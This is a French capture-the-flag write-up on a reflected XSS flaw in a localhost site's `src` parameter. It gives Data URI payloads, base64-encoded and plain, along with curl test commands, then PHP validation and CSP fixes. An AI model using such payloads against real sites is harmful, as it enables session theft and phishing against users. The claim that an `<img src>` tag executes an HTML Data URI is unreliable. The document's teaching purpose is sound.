# Data URI Injection - XSS via paramètre src

## 1. Découverte de la faille

La page utilise un paramètre `src` pour afficher des médias :
```
http://localhost:8080/?page=media&src=photo.jpg
```

Le site affiche le contenu de `src` sans validation → vulnérabilité d'injection.

## 2. Risques - XSS (Cross-Site Scripting)

Le **XSS** permet à un attaquant d'injecter du code JavaScript malveillant qui s'exécute dans le navigateur d'autres utilisateurs, dans le contexte du site de confiance.

**Comment ça fonctionne :**
1. L'attaquant injecte du code dans un paramètre URL (comme `src=`)
2. Le site affiche ce code sans le "nettoyer"
3. Le navigateur de la victime exécute le code, pensant qu'il vient du site légitime
4. Le code malveillant a accès aux cookies, sessions, et peut manipuler la page

### Risques
- **Vol de données** : Cookies de session, tokens CSRF → usurpation d'identité
- **Phishing intégré** : Fausse page de login affichée SUR le site légitime (l'URL reste légitime)
- **Manipulation** : Modification du contenu, redirection invisible, keylogging
- **Confiance aveugle** : La victime fait confiance à l'URL du site → impossible à détecter visuellement

## 3. Exploitation

Un **Data URI** permet d'encoder le contenu d'un fichier directement dans l'URL au lieu de pointer vers un fichier externe.

**Syntaxe :**
```
data:[type MIME];[encodage],[données]
```

**Sans base64 (caractères spéciaux posent problème) :**
```
data:text/html,<script>alert('XSS')</script>
```

Caractères spéciaux qui peuvent être mal interprétés:
Les `<`, `>`, `'`, espaces peuvent être interprétés comme des délimiteurs d'URL.

**Avec base64 (sûr et universel) :**
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K
```
Le base64 transforme n'importe quel contenu en caractères "sûrs" (A-Z, a-z, 0-9, +, /, =).

### Étapes d'exploitation

**1. Créer le payload malveillant**

```bash
# Code à injecter
<script>alert('XSS')</script>

# Encoder en base64 pour éviter les problèmes de caractères spéciaux
echo '<script>alert("XSS")</script>' | base64
# Résultat : PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K
```

**2. Construire l'URL d'attaque**

```
http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K
```

**3. Pourquoi ça fonctionne ?**

Le site fait simplement :
```php
$src = $_GET['src'];  // Récupère n'importe quoi
echo '<img src="' . $src . '">';  // L'affiche sans vérifier
```

Ce qui produit dans le HTML :
```html
<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K">
```

Le navigateur voit cet attribut `src` avec un Data URI et l'exécute comme du HTML !

### Obtenir le flag

```bash
# Tester le payload
curl "http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K"

# Ou sans base64 (plus simple à lire)
curl "http://localhost:8080/?page=media&src=data:text/html,<script>alert('XSS')</script>"

# Pour voir tout le contenu de la page et trouver le flag
http://localhost:8080/?page=media&src=data:text/html,<script>alert(document.body.innerHTML)</script>
```

## 4. Solution

### Validation stricte

```php
// ❌ Vulnérable
$src = $_GET['src'];
echo '<img src="' . $src . '">';

// ✅ Sécurisé
$src = $_GET['src'];
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
$ext = strtolower(pathinfo($src, PATHINFO_EXTENSION));

// Bloquer les Data URIs et valider l'extension
if (!preg_match('/^data:/i', $src) && in_array($ext, $allowed)) {
    echo '<img src="' . htmlspecialchars($src, ENT_QUOTES, 'UTF-8') . '">';
} else {
    die('Format non autorisé');
}
```

### Content Security Policy (CSP)

Bloquer l'exécution de scripts inline :

```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

### Bonnes pratiques

1. **Whitelist** : Autoriser uniquement les extensions/sources connues
2. **Bloquer Data URIs** : Rejeter tout `data:` avec regex
3. **Échappement** : `htmlspecialchars()` sur toutes les sorties
4. **CSP** : Implémenter une politique de sécurité stricte
5. **Validation serveur** : Ne jamais faire confiance aux entrées utilisateur
